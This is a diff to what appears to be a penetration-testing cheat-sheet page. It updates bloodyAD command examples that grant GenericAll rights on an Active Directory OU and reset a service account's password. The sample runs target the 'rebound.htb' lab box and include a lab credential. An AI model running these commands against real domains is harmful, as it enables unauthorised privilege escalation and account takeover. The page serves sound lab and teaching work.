@@ -48,11 +48,11 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 {{< tabcontent set1-1 tab2 >}}
 
 ```console
-python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
 ```
 
 ```console {class=sample-code}
-$ python3 bloodyAD.py -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
+$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
 [+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
 ```
 
@@ -68,7 +68,7 @@ bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set password '<TARG
 ```
 
 ```console {class="sample-code"}
-$ python3 bloodyAD.py -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 set password 'winrm_svc' 'Test1234'
+$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 set password 'winrm_svc' 'Test1234'
 [+] Password changed successfully!
 ```
 
@@ -153,11 +153,11 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 {{< tabcontent set3-1 tab2 >}}
 
 ```console
-python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
 ```
 
 ```console {class="sample-code"}
-$ python3 bloodyAD.py -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
+$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
 [+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
 ```
 
